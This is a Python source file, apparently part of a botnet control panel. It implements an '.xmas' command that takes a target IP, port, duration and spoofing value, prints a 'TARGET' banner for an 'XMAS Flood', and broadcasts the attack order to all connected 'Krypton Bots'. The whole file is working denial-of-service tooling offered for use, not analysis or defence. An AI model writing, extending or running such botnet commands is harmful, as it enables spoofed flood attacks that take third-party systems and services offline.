from colorama import Fore

def xmas(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data):
    if len(args) == 5:
        ip = args[1]
        port = args[2]
        secs = args[3]
        spoofit = args[4]

        xxxx = '''%s============= (%sTARGET%s) ==============
            %s  IP:%s %s
            %sPORT:%s %s
            %sTIME:%s %s
            %sSPOOFIT:%s %s
          %sMETHOD:%s %s'''%(Fore.LIGHTBLACK_EX, Fore.GREEN, Fore.LIGHTBLACK_EX, Fore.CYAN, Fore.LIGHTWHITE_EX, ip, Fore.CYAN, Fore.LIGHTWHITE_EX, port, Fore.CYAN, Fore.LIGHTWHITE_EX, secs, Fore.CYAN, Fore.LIGHTWHITE_EX, spoofit, Fore.CYAN, Fore.LIGHTWHITE_EX, 'XMAS Flood')

        if validate_ip(ip):
            if validate_port(port, True):
                if validate_time(secs):
                    if spoofit.isdigit() and int(spoofit) >= 1 and int(spoofit) <= 32:
                        for x in xxxx.split('\n'):
                            send(client, '\x1b[3;31;40m'+ x)
                        send(client, f" {Fore.LIGHTBLACK_EX}\nAttack {Fore.LIGHTGREEN_EX}successfully{Fore.LIGHTBLACK_EX} sent to all Krypton Bots!\n")
                        broadcast(data)
                    else:
                        send(client, Fore.RED + '\nInvalid spoofit value (1-32)\n')
                else:
                    send(client, Fore.RED + '\nInvalid attack duration (10-1300 seconds)\n')
            else:
                send(client, Fore.RED + '\nInvalid port number (1-65535)\n')
        else:
            send(client, Fore.RED + '\nInvalid IP-address\n')
    else:
        send(client, f'\nUsage: {Fore.LIGHTBLACK_EX}.xmas [IP] [PORT] [TIME] [SPOOFIT]\n')
